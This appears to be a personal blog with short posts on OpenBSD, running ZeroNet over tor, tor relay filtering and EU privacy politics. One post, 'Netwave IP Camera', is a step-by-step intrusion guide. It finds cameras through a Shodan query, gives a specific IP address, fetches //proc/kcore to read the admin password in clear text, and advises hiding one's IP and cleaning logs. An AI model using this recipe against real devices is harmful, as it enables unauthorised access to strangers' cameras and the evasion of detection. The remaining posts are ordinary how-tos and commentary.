title: Clematis
description:
---
Vegan, privacy advocate and passionate BSD user.
---

post.title: Where the time goes?
post.body: Damn... where is the time going? I need things to slow down to have a chance to make some progress on all my projects. Hopefully things will get more quiet as winter comes. Arm64, tor, openbsd... load on the list.

post.title: 100% packet loss
post.body: Bloody hell...time travelling is great fun.... but I've struggled a bit to come back here. But here I am back in 2018! So, what's going? Well I do have a few sexy projects in my head that will start being released this winter (Summer isn't my most productive season). But yeah I do plan to resume a bit of Zeronet blogging... So..stay tuned!

post.title: Netwave IP Camera
post.body:
Quick demo on how to get into Netwave IP camera.
As for many internet of shit story it all starts on shodan.io
Search for: netwave country:"CH"
Don't ask me why the swiss...:o)
```
http://212.90.194.102:8080
```
Here's one... you can try with the default login "admin" and no password.... nope doesn't work... never mind. Add "//proc/kcore" at the end of the address. ```
```
http://212.90.194.102:8080//proc/kcore
```
Here we are...you need 4~5MB of this (pretty much half of it) you should probably wget it rather than trying to download it through the browser.
Open it and search for the username admin, not far away you'll find the password in clear text.

```
@^@000DC5D64C67^@^K%^B.^B^D^P^B^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@admin^@^@^@^@^@^@^@^@admin^@^@^@^@^
```

ahahaha admin as a password for the admin account...not sure that's much better than keeping the default empty password...
cheeses.... anyway.. that's it... you've got the idea...
Of course you take the usual preventive measure to hide your real IP...and you clean the log...and you don't do nasty things!

\#ipcam #failed

post.title: WIFI4EU
post.body:
On the 25th of October 2017, the EU officially signed the [WIFI4EU Regulation](http://www.europarl.europa.eu/sides/getDoc.do?pubRef=-//EP//NONSGML+TA+P8-TA-2017-0326+0+DOC+PDF+V0//EN), intended to promote Internet connectivity in local communities. By ignoring the [open letter](https://www.laquadrature.net/en/print/10231) of the European open-Wifi community, this Regulation undermines the telecom ecosystem diversity. It dismisses the promotion of non-profit Internet Service Provider and enforces an authentication mechanism, forbidding what could have been free and open WiFi hotspots.

Read more on LQDN: [WIFI4EU will not be "free"](https://www.laquadrature.net/en/print/10334)

\#failed #politics #europe #bullshit #wifi4eu

post.title: Run ZeroNet on OpenBSD
post.body:
Wanna run Zeronet on OpenBSD but it's not documented? Don't you worry about it, it couldn't be easier!

```
### Let's install the pre-required packages
pkg_add -v python-2.7 py-gevent py-msgpack
### Let's download ZeroNet from github
ftp [https://github.com/HelloZeroNet/ZeroNet/archive/master.tar.gz](https://github.com/HelloZeroNet/ZeroNet/archive/master.tar.gz)
### Extract the ZeroNet tarball
tar xvfz master.tar.gz
### Ready, Steady, GO!
cd ./ZeroNet-master/
python2.7 zeronet.py
```

I told you it was easy!
Ok so here is some extra tips.

* * *

1/ Running on an headless server and want this to be reachable from another machine on the LAN?

```
Use the _--ui_ip 192.168.x.x_ to have the WebGUI listening on this IP than you can then access from another machine on the same subnet.
```

2/ Use ZeroNet with tor.

```
## install and configure tor
pkg_add -v tor
vi /etc/tor/torrc
## uncomment the lines below in /etc/tor/torrc
ControlPort 9051
CookieAuthentication 1
## start tor
rcctl start tor
## it's always good to have a look at the logs to see what's going on at the same time that it runs (in another terminal)
your torrc should have a line like: _Log notice syslog_ so you logs should be in _/var/log/messages_ so simply:
tail -f /var/log/messages to see the tor logs and check everything is working.
## one quick permission trick with _usergroup_ being obviously your GID.
chgrp usergroup /var/tor/ && chmod 750 /var/tor/
chgrp usergroup /var/tor/control_auth_cookie && chmod 660 /var/tor/control_auth_cookie
## then we're good to start zeronet from the folder where it was extracted
cd /wherever/Zeronet-master
python2.7 zeronet.py --tor_controller 127.0.0.1:9051 --tor_proxy 127.0.0.1:9050 --ui_ip '192.168.X.11'
```

3/ Use ZeroNet with the tor-browser.
Even easier, probably the 'recommended' way to do it on a local workstation even though anyone is free to choose whatever work best for him.
I assume you've got the tor-browser installed (pkg_add tor-browser)

```
## Start tor-browser
## Go in the tor-browser config: about:preferences#advanced , go in the "connection" settings and add 127.0.0.1 in the "No Proxy for" area.
## Start ZeroNet
python2.7 /wherever_it_was_untar/ZeroNet-master/zeronet.py --tor_controller 127.0.0.1:9151 --tor_proxy 127.0.0.1:9150
## Then in tor-browser go to [http://127.0.0.1:43110](http://127.0.0.1:43110) , as NoScript is ON, you need to click on the NoScript icon and Temporarily allow 127.0.0.1
## Reload the page and you're ready to go.
```

\#tor #OpenBSD #ZeroNet #tor-browser

post.title: How to filter tor relays
post.body:
I thought I would re-share quickly how to filter tor relay per country to specifically exclude some of them. Typically the unfriendly location (US, GB...) and how to specify some closer European exit only. Simply add these three lines to your torrc config file.

```
ExcludeNodes {us},{gb},{ie},{ru},{jp},{im},{il}
ExitNodes {fr},{ch},{de},{nl},{be},{cz},{ro},{is},{md},{pl},{ua}
StrictNodes 1
```

Your torrc config file should be in _~/TorBrowser-Data/Data/torrc_ if you're using the tor-browser or in _/etc/tor/torrc_ if you're using the standard tor daemon.

\#tor #howto

---

### List of Tor country codes:

post.title: What are you likely to find on this blog?
post.body:
Hello,
Well, since I am starting this from scratch I though you might want to know what you can expect to find posted here.
- Personal comment and link to actualities that matters to me and make me react.
- A weekly post called "Bookmark" where I will re-share some links on various article I end up reading that week and found interesting. Topics will always be around unix, opensource, infosec, BSD ... always a bit nerdy.
- Some quick "Howto" which could be very short where I kind of re-share quick tips on a specific topic. Likely to be around OpenBSD and other piece of software or hardware I end up playing with.
Feel free to comment at any time or to contact me directly.
Take it easy.
-- clematis

post.title: LQDN versus EDRi...
post.body:
[“European Parliament failed to protect our Privacy”](http://www.laquadrature.net/en/eprivacy_failed) VERSUS [“Euro-parliamentarians say a clear “no” to the anti-privacy lobby”](https://edri.org/euro-parliamentarians-say-clear-no-anti-privacy-lobby/) … or #LQDN VS #EDRi … sounds like a pretty opposite point of view to me.
\#vieprivée #politique #bullshit #eprivacy #europe
